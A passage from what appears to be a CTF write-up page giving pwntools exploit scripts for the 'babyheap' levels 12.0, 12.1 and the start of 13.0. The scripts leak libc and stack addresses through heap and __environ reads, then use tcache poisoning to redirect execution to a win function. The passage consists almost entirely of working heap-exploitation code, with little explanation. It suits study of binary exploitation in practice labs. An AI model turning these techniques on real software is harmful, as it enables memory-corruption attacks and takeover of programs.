</span></span><span style="display:flex;"><span><span style="color:#75715e"># p.recvuntil(b&#39;your allocations is at: &#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cur_stack_addr = int(p.recvline().strip()[:-1], 16)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># stack_ret = cur_stack_addr + 0x118</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p.recvuntil(b&#39;main is at: &#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cur_main_addr = int(p.recvline().strip()[:-1], 16)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cur_win_addr = cur_main_addr - main_addr + win_addr</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print (hex(stack_ret), hex(cur_win_addr))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x430</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>bin_echo <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>stack_addr <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print (hex(bin_echo))
</span></span><span style="display:flex;"><span>print (hex(stack_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cur_win_addr <span style="color:#f92672">=</span> bin_echo <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x00002110</span> <span style="color:#f92672">+</span> win_addr
</span></span><span style="display:flex;"><span>stack_ret <span style="color:#f92672">=</span> stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x7ffc77e5d078</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7ffc77e5cf02</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(stack_ret))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(cur_win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>quit(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-120">level 12.0</h2>
<p>泄漏 <code>__environ</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level12.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_arena_96 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebbe0</span>
</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ef2e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000016ce</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001500</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_stack <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffcf12f9510</span>
</span></span><span style="display:flex;"><span>stack_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffcf12f9668</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x430</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> u64(puts(p, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print (hex(main_arena_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>environ_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> main_arena_96 <span style="color:#f92672">+</span> environ
</span></span><span style="display:flex;"><span>print (hex(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p.interactive()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">3</span>, p64(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cur_stack_base <span style="color:#f92672">=</span> u64(puts(p, <span style="color:#ae81ff">5</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>cur_target_stack <span style="color:#f92672">=</span> cur_stack_base <span style="color:#f92672">-</span> stack_base <span style="color:#f92672">+</span> target_stack
</span></span><span style="display:flex;"><span>print (hex(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">36</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">36</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, p64(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">36</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># stack_malloc_win</span>
</span></span></code></pre></div><h2 id="level-121">level 12.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level12.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p, &#34;b *$rebase(0x1b9d)&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># main_arena_96 = 0x1ecbe0</span>
</span></span><span style="display:flex;"><span>main_arena_96 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebbe0</span>
</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ef2e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000016ce</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001500</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_stack <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffce7ac9308</span>
</span></span><span style="display:flex;"><span>stack_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffce7ac9460</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x430</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> u64(puts(p, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print (hex(main_arena_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>environ_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> main_arena_96 <span style="color:#f92672">+</span> environ
</span></span><span style="display:flex;"><span>print (hex(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p.interactive()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">3</span>, p64(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cur_stack_base <span style="color:#f92672">=</span> u64(puts(p, <span style="color:#ae81ff">5</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>cur_target_stack <span style="color:#f92672">=</span> cur_stack_base <span style="color:#f92672">-</span> stack_base <span style="color:#f92672">+</span> target_stack
</span></span><span style="display:flex;"><span>print (hex(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, p64(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-130">level 13.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
